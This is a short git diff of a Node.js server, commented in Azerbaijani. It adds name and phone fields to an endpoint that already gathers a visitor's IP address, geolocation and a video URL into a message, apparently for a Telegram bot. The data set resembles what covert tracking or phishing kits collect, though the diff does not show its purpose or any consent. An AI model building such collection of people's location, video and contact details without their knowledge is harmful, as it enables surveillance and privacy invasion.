@@ -54,7 +54,7 @@ function getClientIp(req) {
 // ================== API ==================
 app.post('/api/send-data', async (req, res) => {
   try {
-    const { videoUrl, location, action } = req.body;
+    const { videoUrl, location, action, name, phone } = req.body; // <-- buraya name, phone əlavə edildi
 
     const ip = getClientIp(req);
 
@@ -65,8 +65,14 @@ app.post('/api/send-data', async (req, res) => {
       message += `🧩 Action: ${action}\n`;
     }
 
+    // Burada ad və telefonu göndəririk
+    if (name || phone) {
+      message += `👤 Ad: ${name || 'yox'}\n`;
+      message += `📞 Telefon: ${phone || 'yox'}\n`;
+    }
+
     if (videoUrl) {
-      message += `📞 Nömrə: ${videoUrl}\n`;
+      message += `📹 Video URL: ${videoUrl}\n`;
     }
 
     if (location?.latitude && location?.longitude) {
@@ -84,6 +90,7 @@ app.post('/api/send-data', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
+
 
 // ================== TELEGRAM WEBHOOK ==================
 app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
